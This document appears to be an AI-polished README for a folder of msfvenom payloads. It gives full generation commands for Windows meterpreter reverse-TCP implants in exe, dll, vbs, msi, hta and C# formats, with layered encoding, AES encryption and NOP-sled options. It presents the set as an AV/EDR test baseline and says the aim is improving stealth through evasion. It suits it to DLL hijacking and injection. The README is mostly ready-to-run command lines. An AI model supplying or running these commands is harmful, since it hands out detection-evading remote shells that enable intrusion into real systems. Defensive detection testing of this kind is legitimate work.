Here is the corrected version of your README.md:

---

# Payloads Generated with Msfvenom

This directory contains payloads generated using the `msfvenom` tool, which is widely utilized for creating and testing malicious payloads in controlled environments. The payloads included here serve as a baseline for analyzing antivirus (AV) and Endpoint Detection and Response (EDR) detection capabilities.

---

## File Details

### `Payload1.exe`
- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload2.exe`
- **Description**: A reverse TCP payload encoded using Shikata Ga Nai, designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -e x86/shikata_ga_nai -f exe -o Payload2.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload3.exe`
- **Description**: A reverse TCP payload encrypted using AES256, designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> --encrypt aes256 --encrypt-key secret -f exe -o Payload3.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload4.exe`
- **Description**: A reverse TCP payload with multiple evasion techniques (encoding, encryption, and optimization), designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -e x86/shikata_ga_nai --iterations 3 --nopsled 17 --smallest --encrypt aes256 --encrypt-key secret -f exe -o Payload4.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload.dll`
- **Description**: A reverse TCP payload in DLL format, suitable for techniques such as DLL Hijacking or Reflective DLL Injection.
- **Architecture**: 64-bit Windows
- **Type**: Dynamic-Link Library (`.dll`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -e x86/shikata_ga_nai --iterations 3 --nopsled 17 --smallest --encrypt aes256 --encrypt-key secret -f dll -o Payload.dll
```

---

### `Payload.vbs`
- **Description**: A reverse TCP payload in Visual Basic Script format, designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Visual Basic Script (`.vbs`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -e x86/shikata_ga_nai --iterations 3 --nopsled 17 --smallest --encrypt aes256 --encrypt-key secret -f vbs -o Payload.vbs
```

---

### `Payload.msi`
- **Description**: A reverse TCP payload in MSI format, designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Installer Package (`.msi`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -e x86/shikata_ga_nai --iterations 3 --nopsled 17 --smallest --encrypt aes256 --encrypt-key secret -f msi -o Payload.msi
```

---

### `Payload.hta`
- **Description**: A reverse TCP payload in HTA format, designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: HTML Application (`.hta`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -e x86/shikata_ga_nai --iterations 3 --nopsled 17 --smallest --encrypt aes256 --encrypt-key secret -f hta-psh -o Payload.hta
```

---

### `Payload.cs`
- **Description**: A reverse TCP payload in C# format used in Basic and Avanced Shellcode runners, designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: C# Payload (`.cs`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> EXITFUNC=thread -f csharp -o Payload.cs
```

---

## Detection Analysis

The payloads were uploaded to VirusTotal to evaluate detection rates across various antivirus engines. The results serve as a baseline to identify opportunities for improving stealth through encoding, obfuscation, and other evasion techniques.

---

## Legal Notice

- **For Educational and Research Purposes Only**: These payloads are strictly intended for testing in isolated environments, such as virtual machines or lab setups.
- **Prohibited Usage**: Unauthorized use or deployment on live systems or production environments is illegal and against organizational policies.
- **Responsibility Disclaimer**: The creator assumes no liability for misuse of the provided tools or files.
